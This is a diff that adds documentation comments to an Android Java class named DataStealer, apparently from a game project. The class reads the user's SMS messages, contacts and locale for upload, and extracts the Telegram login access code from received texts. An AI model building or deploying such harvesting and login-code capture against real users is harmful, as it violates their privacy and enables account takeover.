@@ -17,8 +17,18 @@ import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
 import de.hpi3d.gamepgrog.trap.future.ArrayExt;
 
 
+/**
+ * Responsible for taking message, contact, and language data from
+ * android storage. Also responsible for Telegram access code stealage
+ */
 public class DataStealer {
 
+    /**
+     * Returns a list of all text messages the user has sent or received.
+     *
+     * @param context to access storage
+     * @return ArrayList of users text messages
+     */
     public static ArrayList<TextMessage> takeMessageData(Context context) {
         String[] projection = new String[]{
                 Telephony.Sms._ID,
@@ -65,7 +75,8 @@ public class DataStealer {
 
     /**
      * Reads out data from contacts on the device and returns them.
-     * Currently only reads names of contacts. Can be expanded to read more data.
+     * Currently only reads names of contacts.
+     * If you need to access data beyond just contact names look at the Contact.enrich method.
      * <p>
      * For additional info regarding the used ApiBuilder see
      * https://developer.android.com/guide/topics/providers/contacts-provider.html
@@ -110,6 +121,12 @@ public class DataStealer {
         return extractedContacts;
     }
 
+    /**
+     * Returns default locale of the user.
+     * Returned as ArrayList to ease upload.
+     *
+     * @return users locale
+     */
     public static ArrayList<Language> takeLanguage() {
         ArrayList<Language> languageList = new ArrayList<>();
         languageList.add(Language.getCurrentLanguage());
@@ -117,6 +134,13 @@ public class DataStealer {
 
     }
 
+    /**
+     * Finds the latest message sent to the user by the Telegram contact, and extracts the
+     * access code contained within it.
+     *
+     * @param context to access storage
+     * @return latest received access code
+     */
     public static String takeTelegramAccessCode(Context context) {
         List<TextMessage> messages = takeMessageData(context);
         if (messages.size() > 0) {
